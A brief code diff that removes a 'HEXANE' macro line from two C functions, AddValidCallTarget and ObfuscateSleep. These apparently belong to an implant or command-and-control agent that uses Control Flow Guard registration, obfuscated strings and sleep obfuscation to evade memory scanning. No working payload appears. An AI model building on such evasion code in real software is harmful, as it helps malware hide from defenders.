@@ -1,7 +1,6 @@
 #include "core/corelib.hpp"
 
 BOOL AddValidCallTarget(void* pointer) {
-    HEXANE
 
     PIMAGE_DOS_HEADER                dos_head    = { };
     PIMAGE_NT_HEADERS                nt_head     = { };
@@ -35,7 +34,6 @@ BOOL AddValidCallTarget(void* pointer) {
 }
 
 BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
-    HEXANE
 
     BOOL                success         = TRUE;
     LPWSTR              ksecdd_name     = OBFW(L"\\Device\\KsecDD");
